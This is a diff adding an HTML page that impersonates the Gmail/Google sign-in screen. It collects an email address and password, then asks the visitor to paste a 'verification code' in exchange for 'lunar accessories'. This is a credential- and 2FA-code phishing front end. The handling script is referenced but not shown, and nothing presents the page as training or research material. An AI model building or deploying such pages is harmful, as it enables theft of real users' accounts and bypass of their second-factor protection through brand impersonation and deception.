@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail - Sign in</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Login Form -->
+        <div id="loginForm">
+            <div class="header">
+                <div class="logo"></div>
+                <h1 class="title">Sign in</h1>
+                <p class="subtitle">Use your Google Account</p>
+            </div>
+            
+            <div class="form-container">
+                <div class="input-group">
+                    <label class="input-label">Email or phone</label>
+                    <input type="email" id="email" class="input-field" placeholder="Enter your email" autocomplete="username">
+                    <div id="emailError" class="error-message">Please enter a valid email address</div>
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label">Password</label>
+                    <input type="password" id="password" class="input-field" placeholder="Enter your password" autocomplete="current-password">
+                    <div id="passwordError" class="error-message">Please enter your password</div>
+                </div>
+                
+                <div class="attempt-counter" id="attemptCounter">
+                    Attempts remaining: <span id="attemptsLeft">3</span>
+                </div>
+                
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="window.location.href='https://accounts.google.com/signup'">Create account</button>
+                    <button class="btn btn-primary" id="signInBtn" onclick="signIn()">Next</button>
+                </div>
+            </div>
+            
+            <div class="footer">
+                <p>Forgot email? • Privacy Policy • Terms of Service</p>
+            </div>
+        </div>
+        
+        <!-- Verification Form -->
+        <div id="verificationForm" class="hidden">
+            <div class="verification-container">
+                <div class="verification-icon">✓</div>
+                <h2 class="verification-title">Verification required</h2>
+                <p class="verification-text">
+                    A verification code has been sent to your email.<br>
+                    Please check your spam folder if you don't see it.<br>
+                    <strong>Paste the code below to verify your account:</strong>
+                </p>
+                
+                <input type="text" id="verificationCode" class="code-input" placeholder="Paste code here" maxlength="6">
+                <div id="codeError" class="error-message"></div>
+                
+                <p class="spam-notice">Check spam and gmail to get the accessories</p>
+                <p class="spam-notice">Below: Paste code here get access to lunar accessories</p>
+                
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="goBack()">Back</button>
+                    <button class="btn btn-primary" id="verifyBtn" onclick="verifyCode()">Confirm</button>
+                </div>
+                
+                <div id="loading" class="hidden">
+                    <div class="loading"></div>
+                    <p>Getting access to code...</p>
+                </div>
+                
+                <div id="successMessage" class="hidden">
+                    <p class="success-message">Thanks for using!</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Limit Reached Message -->
+        <div id="limitReached" class="hidden">
+            <div class="limit-reached">
+                <h2>Access Denied</h2>
+                <p>You have exceeded the maximum number of attempts.</p>
+                <p>Please try again later.</p>
+            </div>
+        </div>
+    </div>
+    
+    <script src="script.js"></script>
+</body>
+  </html>
+
